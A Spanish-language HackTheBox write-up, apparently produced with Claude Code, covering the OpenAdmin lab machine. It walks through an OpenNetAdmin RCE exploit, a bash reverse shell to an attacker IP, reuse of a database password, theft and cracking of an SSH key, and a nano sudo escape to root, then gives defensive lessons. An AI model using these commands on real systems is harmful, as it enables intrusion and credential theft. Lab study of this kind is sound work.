---
title: OpenAdmin (HackTheBox Medium)
date: 2026-06-15
tags: [ciberseguridad, htb, pentesting, medium, linux, rce, credential-reuse, gtfobins, ssh, john]
type: nota
status: en-progreso
source: claude-code
aliases: [OpenAdmin, HTB OpenAdmin, OpenNetAdmin RCE]
---

# OpenAdmin — HackTheBox (Medium)

SO: Linux (Ubuntu) · Dificultad: Medium · Skills: enumeración web, CVE en app web (OpenNetAdmin RCE), reúso de credenciales, servicios internos que filtran secretos, cracking de passphrase de clave SSH, escalada por sudo + GTFOBins (nano).

> HTB es un laboratorio legal y autorizado. Sólo se opera sobre máquinas que la plataforma te asigna. No apliques esto fuera de un entorno con permiso explícito.

OpenAdmin es una cadena Linux muy "de manual" que enseña cuatro patrones que verás una y otra vez: (1) un servicio web obsoleto —OpenNetAdmin 18.1.1— vulnerable a un **RCE público** que te da shell como `www-data`; (2) una **contraseña de base de datos en un fichero de configuración** que está **reutilizada** por un usuario del sistema (`jimmy`); (3) un **servicio web interno** (sólo en localhost) que, al consultarlo, **filtra la clave privada SSH** de otro usuario (`joanna`), cuya passphrase se crackea con John; y (4) una entrada en `sudo -l` que permite ejecutar `nano` como root → escapas a shell de root vía **GTFOBins**. Es un recorrido limpio de www-data → jimmy → joanna → root.

## Objetivo

Conseguir las dos flags:
- `user.txt` — en el home del usuario sin privilegios (`/home/joanna/user.txt`).
- `root.txt` — en `/root/root.txt`, sólo legible como root.

## Acceso a la máquina (paso previo)

1. Conéctate a la VPN del laboratorio y deja la terminal abierta (no la cierres mientras juegas):

```bash
sudo openvpn lab_<usuario>.ovpn
```

   Verás al final algo como `Initialization Sequence Completed`: eso significa que el túnel está arriba. Si usas **Pwnbox**, ya vienes conectado y te saltas este paso.

2. En el portal de HTB pulsa **Spawn Machine**. Te dará una IP del rango de retiradas `10.10.10.x`. Las máquinas retiradas requieren suscripción **VIP/VIP+**.

3. Comprueba conectividad y fija la variable mental `<IP>`:

```bash
ping -c2 <IP>
```

   Espera respuesta (`64 bytes from <IP> ... time=NN ms`). Si no responde, revisa que la VPN siga arriba y que la máquina haya terminado de arrancar (dale ~1 minuto). En adelante sustituye `<IP>` por la IP real.

## Reconocimiento

Patrón inicial siempre igual: **escaneo de todos los puertos TCP** con detección de versión y scripts por defecto. Hacerlo a `-p-` (los 65535) evita la trampa clásica de perderte un servicio en un puerto alto.

```bash
nmap -sC -sV -p- -oN nmap.txt <IP>
```

Qué hace: `-p-` escanea los 65535 puertos, `-sV` interroga banners para fingerprintear versiones, `-sC` lanza los scripts NSE "default" (los seguros/de enumeración), `-oN` guarda en formato legible.

Salida esperada (relevante): **sólo dos puertos abiertos**.

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

Qué buscar e interpretar:
- **22/SSH (OpenSSH 7.6p1)**: vía de acceso si conseguimos credenciales o una clave. No vamos a fuzzear SSH a ciegas; lo dejamos como "puerta de salida" para cuando tengamos creds/clave.
- **80/HTTP (Apache 2.4.29)**: superficie principal. Apache 2.4.29 no tiene un RCE directo trivial; la vulnerabilidad estará en **la aplicación** que sirve, no en Apache. Hay que enumerar contenido.

La conclusión de recon: la entrada es por la web. Toca buscar qué hay servido en el puerto 80.

## Enumeración

### 80/HTTP — fuzzing de directorios

El index del puerto 80 es la página por defecto de Apache (la de "It works / Ubuntu default"), nada útil a primera vista. Esto es habitual: la app interesante suele estar en un **subdirectorio**. Patrón: **fuzzear directorios** con un diccionario.

```bash
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -o gobuster.txt
```

Qué hace: gobuster pide cada `palabra` del diccionario como ruta y reporta las que no dan 404. `-t 50` paraleliza, `-o` guarda.

Salida esperada (lo importante):

```
/music (Status: 301)
/ona   (Status: 301)
...
```

Qué buscar:
- `/music` es un front estático bonito pero, al navegarlo, su enlace de "Login" apunta a `/ona`.
- **`/ona`** es la joya: redirige a la interfaz de **OpenNetAdmin**.

### /ona — identificar versión de OpenNetAdmin

Navega a `http://<IP>/ona`. La propia interfaz de OpenNetAdmin muestra en el dashboard un aviso del tipo:

```
NOTICE: Found a more recent version of ONA (v18.1.1)...
```

Schema-first: hemos identificado **OpenNetAdmin v18.1.1** (categoría: *aplicación web de gestión de red, versión obsoleta*). Cuando tengas un producto + versión concreta, el reflejo es: **buscar exploits públicos para esa versión**.

```bash
searchsploit opennetadmin
```

Salida esperada:

```
OpenNetAdmin 18.1.1 - Remote Code Execution    | php/webapps/47691.sh
```

Esto es la pista clave: existe un **RCE conocido** para 18.1.1.

## Acceso inicial (foothold)

### Categoría de la vuln: Command Injection → RCE en OpenNetAdmin 18.1.1

El bug vive en el endpoint que procesa peticiones de "módulos" de ONA (`dcm.php`). Una entrada controlada por el usuario (parámetros como `xajax`/`xajaxargs` hacia el módulo de comandos) acaba concatenándose en una ejecución de shell del lado servidor sin sanear, de modo que un `POST` cuidadosamente formado ejecuta comandos arbitrarios como el usuario del servidor web (`www-data`). El exploit público `47691.sh` automatiza ese POST en un bucle, dándote una **pseudo-shell** interactiva.

#### Paso 1 — Obtener y revisar el exploit

```bash
searchsploit -m php/webapps/47691.sh
cat 47691.sh
```

Por qué revisarlo: nunca ejecutes a ciegas un script de exploit-db. Verás que es un bash corto que hace `curl` con `--data` a `http://<IP>/ona/...` inyectando un comando, y reenvía tu input en un loop. Es seguro y transparente.

Trampa típica: el script espera la URL **con la barra final correcta**. Asegúrate de pasar `http://<IP>/ona/` exactamente como espera.

#### Paso 2 — Lanzar el exploit

```bash
bash 47691.sh http://<IP>/ona/
```

Salida esperada: un prompt tipo

```
$
```

Comprueba quién eres:

```bash
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Ya tienes **ejecución de comandos como `www-data`**. Esta pseudo-shell es frágil (cada comando es un POST nuevo, sin estado, sin Ctrl-C, sin tab). El siguiente reflejo es **estabilizarla**.

Alternativa manual (si el script falla o quieres entender el motor): puedes reproducir el POST con curl directamente, inyectando en el parámetro vulnerable y leyendo la respuesta. El script no es más que eso envuelto en un bucle.

## Shell estable

Patrón: pasar de una RCE sin TTY a una **reverse shell con PTY**. Primero pon un listener en tu máquina:

```bash
nc -lvnp 4444
```

Desde la pseudo-shell de `www-data`, lanza una reverse shell (bash):

```bash
bash -c 'bash -i >& /dev/tcp/<IP_ATACANTE>/4444 0>&1'
```

(`<IP_ATACANTE>` es tu IP de la VPN, normalmente `tun0` —compruébala con `ip a`.) Recibirás la conexión en el `nc`. Ahora **mejora la shell** a una TTY interactiva (te da Ctrl-C, historial, tab):

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# luego: Ctrl-Z
stty raw -echo; fg
# en la shell remota:
export TERM=xterm
```

Por qué: `pty.spawn` crea un pseudo-terminal real; el `stty raw -echo` en local y `fg` reconectan tu terminal sin eco doble. Con esto puedes usar `su`, editores, etc. sin que se cuelguen.

## Escalada de privilegios

### Etapa A: www-data → jimmy (reúso de credenciales)

Patrón fundamental: **las apps web guardan credenciales de BD en ficheros de config**, y los usuarios reutilizan contraseñas. Busca el fichero de configuración de ONA.

```bash
cat /opt/ona/www/local/config/database_settings.inc.php
```

Salida esperada (extracto):

```php
$ona_contexts=array (
  'DEFAULT' =>
  array (
    'databases' => array ( 0 => array (
        'db_type' => 'mysqli',
        'db_host' => 'localhost',
        'db_login' => 'ona_sys',
        'db_passwd' => '<pass_bd>',   // ← aquí hay una contraseña en claro
        'db_database' => 'ona_default',
      ) ),
  ),
);
```

Qué buscar: el valor de `db_passwd`. Es una contraseña en claro. Ahora la **hipótesis de reúso**: ¿hay usuarios del sistema? Mira `/etc/passwd`:

```bash
cat /etc/passwd | grep -E 'sh$'
```

Verás usuarios con shell, entre ellos **`jimmy`** y **`joanna`**. Prueba la contraseña de BD contra `jimmy`:

```bash
su jimmy
# Password: <pass_bd>
```

Si funciona (es el caso), confirma:

```bash
id
# uid=1000(jimmy) ...
```

Alternativa más cómoda: si la misma contraseña vale para SSH, conéctate directamente (`ssh jimmy@<IP>`) y tendrás una TTY limpia desde el principio.

### Etapa B: jimmy → joanna (servicio interno que filtra la clave SSH)

Como `jimmy`, enumera servicios que escuchan **sólo en localhost** (no salían en el nmap externo precisamente por eso):

```bash
ss -tlnp
# o: netstat -tlnp
```

Salida esperada: además de 22 y 80, un puerto local extra, p.ej. **`127.0.0.1:52846`**. Ese es un servidor web interno. Busca dónde vive su código (web interna típica de Apache):

```bash
ls -la /var/www/internal/
cat /var/www/internal/index.php
cat /var/www/internal/main.php
```

Qué buscar e interpretar:
- `index.php` contiene un login con un **hash de contraseña embebido** y, tras autenticar, **redirige/incluye `main.php`**.
- `main.php` es lo jugoso: imprime (con `<pre>`) **la clave privada SSH de `joanna`** (`/home/joanna/.ssh/id_rsa`). Es decir, cualquiera que pueda llegar a ese endpoint obtiene la clave de joanna.

No necesitas ni romper el login: como ya estás en la máquina, **consulta el endpoint directamente** (o incluso lee el `main.php`/la clave si los permisos lo permiten). La vía canónica es hacer `curl` a `main.php`:

```bash
curl http://localhost:52846/main.php
```

Salida esperada: un bloque

```
-----BEGIN RSA PRIVATE KEY-----
... (cuerpo de la clave omitido por seguridad) ...
-----END RSA PRIVATE KEY-----
```

Dos cosas críticas que buscar:
1. Es la **clave privada** de joanna → vector de acceso por SSH.
2. La cabecera `Proc-Type: 4,ENCRYPTED` / `DEK-Info: AES-128-CBC` indica que **está cifrada con passphrase**. No te servirá sin esa passphrase → hay que crackearla.

Guarda la clave en tu máquina atacante (cópiala íntegra a un fichero `id_rsa`) y ajusta permisos:

```bash
chmod 600 id_rsa
```

#### Crackear la passphrase con John

Patrón: clave SSH cifrada → `ssh2john` para convertirla a un hash crackeable → John con `rockyou`.

```bash
ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

Qué hace `ssh2john`: extrae el material cifrado y el esquema (AES-128-CBC con clave derivada de la passphrase) a un formato `$sshng$...` que John sabe atacar. John prueba cada palabra de rockyou como passphrase candidata.

Salida esperada:

```
<passphrase>     (id_rsa)
1g 0:00:00:00 DONE ...
```

Para volver a verla luego: `john --show id_rsa.hash`.

#### SSH como joanna

```bash
ssh -i id_rsa joanna@<IP>
# Enter passphrase for key 'id_rsa': <passphrase>
```

Estás dentro como **joanna** con una TTY real. Esto cubre la `user.txt` (ver sección Flags).

### Etapa C: joanna → root (sudo + GTFOBins, nano)

Reflejo obligatorio en cualquier usuario nuevo: **¿qué puedo ejecutar como root sin contraseña?**

```bash
sudo -l
```

Salida esperada:

```
User joanna may run the following commands on openadmin:
    (ALL) NOPASSWD: /bin/nano /opt/priv
```

Schema-first: categoría = **sudo sobre un editor**. Un editor que corre como root es un *jailbreak* directo a shell de root, porque casi todos permiten ejecutar comandos o leer/escribir ficheros arbitrarios. nano está en **[GTFOBins](https://gtfobins.github.io/gtfobins/nano/)**.

Pasos exactos del truco de nano (técnica `Ctrl+R Ctrl+X` = "Read File" + "Execute Command"):

1. Abre nano como root tal cual permite sudo:

```bash
sudo /bin/nano /opt/priv
```

2. Dentro de nano pulsa **`Ctrl + R`** (Read File) y a continuación **`Ctrl + X`** (esto cambia el prompt a "Command to execute").
3. En el prompt "Command to execute" escribe exactamente:

```
reset; sh 1>&0 2>&0
```

   y pulsa Enter.

Qué hace: nano ejecuta ese comando con sus privilegios (root). `reset` reinicia la terminal para que sea usable; `sh 1>&0 2>&0` lanza una shell redirigiendo stdout y stderr al descriptor de entrada (el TTY de nano), de modo que ves y controlas la shell. Resultado:

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
```

Ya eres **root**.

Trampa: en algunas builds de nano la secuencia del menú varía (puede ser `Ctrl+R` y luego `Ctrl+X`, o que el atajo "Execute Command" se muestre distinto). Si no aparece el prompt de comando, mira la barra inferior de nano para ver el atajo real ("^X Execute Command" / "Read File"). El payload `reset; sh 1>&0 2>&0` es el de GTFOBins y es el que da una shell interactiva limpia.

## Flags

`user.txt` (como joanna):

```bash
cat /home/joanna/user.txt
# <flag>  (32 hex)
```

`root.txt` (como root, tras el escape de nano):

```bash
cat /root/root.txt
# <flag>  (32 hex)
```

Las flags son hashes de 32 caracteres y cambian en cada spawn; cópialas al portal de HTB para validar.

## Patrón y teoría

Lo reutilizable de esta máquina (lo que de verdad importa):

1. **Producto + versión → exploit público.** En cuanto identificas "OpenNetAdmin 18.1.1", el camino es `searchsploit`/exploit-db. Mantén el reflejo de **fingerprintear versión** (banners, footers, paneles "update available"). Ver [[08-vulnerabilidades-y-explotacion]].
   - **Defensa (dev):** parchea/actualiza dependencias y software de terceros; quita avisos de versión; no dejes apps de administración expuestas en `/` sin auth fuerte. Un WAF mitiga, pero el fix real es **no correr software vulnerable**.

2. **Secretos en ficheros de configuración + reúso de credenciales.** La contraseña de BD de ONA servía para el usuario `jimmy` del sistema. Es el patrón más rentable en post-explotación. Ver [[05-identidad-auth-y-secretos]].
   - **Defensa:** credenciales **únicas por servicio** (nunca reutilizar la de BD para una cuenta de sistema); secretos fuera del código (variables de entorno/secret manager); rotación; el usuario de la app (`www-data`) no debería poder leer credenciales que abran cuentas de personas.

3. **Servicios internos no son "seguros por estar en localhost".** El web de `:52846` filtraba la clave privada de joanna a cualquiera con acceso local. "Interno" ≠ "confidencial". Ver [[06-seguridad-de-sistemas-y-hardening]].
   - **Defensa:** **nunca** sirvas claves privadas por un endpoint; las claves SSH no deberían ser legibles por la app web; segmenta privilegios; cifra las claves con passphrase fuerte (que no esté en rockyou).

4. **Clave SSH cifrada → crackeable si la passphrase es débil.** `ssh2john` + John + rockyou. El cifrado de la clave es sólo tan bueno como su passphrase.
   - **Defensa:** passphrases largas/aleatorias; preferir claves en hardware (FIDO2/`-sk`); detección de exfiltración de `id_rsa`.

5. **`sudo` sobre un binario "inofensivo" = root (GTFOBins).** Editores, paginadores, intérpretes, herramientas con `!`/`-exec`… casi cualquier binario con sudo es escapable. `sudo -l` es siempre el primer comando como usuario nuevo. Ver [[06-seguridad-de-sistemas-y-hardening]].
   - **Defensa:** principio de **mínimo privilegio** en `/etc/sudoers`: nunca des sudo sobre editores/paginadores/intérpretes; si necesitas privilegio para una tarea concreta, escribe un script restringido y auditado; revisa sudoers contra GTFOBins.

## Trampas y errores comunes

1. **Olvidar `-p-` en nmap.** Aquí no afecta (todo está en 22/80), pero el patrón de "servicio interno en puerto alto" (52846) refuerza la idea de escanear completo *y* enumerar puertos locales desde dentro con `ss -tlnp`.
2. **Quedarte en la pseudo-shell del exploit.** Es sin estado y rompe con `su`/editores. Estabiliza con reverse shell + `python pty` + `stty raw -echo` antes de seguir.
3. **Intentar romper el login de `/var/www/internal` cuando no hace falta.** Ya estás en la caja como jimmy: lee el código y `curl` directo a `main.php`. Perder el tiempo crackeando el hash del login es un desvío.
4. **No notar que la clave SSH está cifrada.** Si intentas `ssh -i id_rsa joanna@<IP>` sin passphrase y falla, no es que la clave sea inválida: fíjate en `Proc-Type: 4,ENCRYPTED` → toca `ssh2john` + John. Y recuerda `chmod 600 id_rsa` o SSH la rechaza por permisos.
5. **Atascarse con el atajo de nano.** El payload es `reset; sh 1>&0 2>&0` tras `Ctrl+R`→`Ctrl+X`. Si no ves el prompt "Command to execute", consulta la barra de atajos de tu versión de nano. No edites `/opt/priv` a mano: la escalada es el *escape* del editor, no el contenido del fichero.

## Conexiones

- [[HTB_Medium/00_README]]
- [[MOC_Ciberseguridad]]
- [[12-aprender-y-carrera]]
- [[HTB_Easy/00_README]] (nivel anterior)
- [[08-vulnerabilidades-y-explotacion]] (CVE/RCE en app web, exploit-db/searchsploit)
- [[05-identidad-auth-y-secretos]] (secretos en config, reúso de credenciales, cracking de passphrase)
- [[06-seguridad-de-sistemas-y-hardening]] (servicios internos, sudo/GTFOBins, mínimo privilegio)
